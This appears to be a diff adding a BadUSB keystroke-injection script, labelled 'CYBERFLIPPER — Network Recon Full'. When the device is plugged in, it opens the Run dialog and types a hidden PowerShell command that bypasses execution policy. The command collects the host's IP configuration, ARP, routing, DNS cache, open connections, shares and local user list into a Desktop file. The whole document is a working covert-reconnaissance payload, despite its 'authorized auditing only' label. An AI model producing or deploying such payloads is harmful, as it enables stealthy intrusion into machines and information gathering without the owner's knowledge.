@@ -1,0 +1,9 @@
+REM CYBERFLIPPER — Network Recon Full (OMG-Cable-inspired)
+REM Full network reconnaissance: IP config, ARP table, routing,
+REM DNS cache, open ports, active connections, shares
+REM FOR AUTHORIZED SECURITY AUDITING ONLY
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -NoP -W Hidden -Exec Bypass -C "$f=[Environment]::GetFolderPath('Desktop')+'\net_recon_'+$(hostname)+'.txt';'=== NETWORK RECON ===' | Out-File $f;'Hostname: '+$env:COMPUTERNAME | Out-File -Append $f;'Date: '+(Get-Date) | Out-File -Append $f;'--- IPCONFIG ---' | Out-File -Append $f;ipconfig /all | Out-File -Append $f;'--- ARP TABLE ---' | Out-File -Append $f;arp -a | Out-File -Append $f;'--- ROUTE TABLE ---' | Out-File -Append $f;route print | Out-File -Append $f;'--- DNS CACHE ---' | Out-File -Append $f;ipconfig /displaydns | Select-Object -First 100 | Out-File -Append $f;'--- NETSTAT ---' | Out-File -Append $f;netstat -an | Out-File -Append $f;'--- SHARES ---' | Out-File -Append $f;net share | Out-File -Append $f;'--- NET USERS ---' | Out-File -Append $f;net user | Out-File -Append $f;'=== END ===' | Out-File -Append $f"
+ENTER
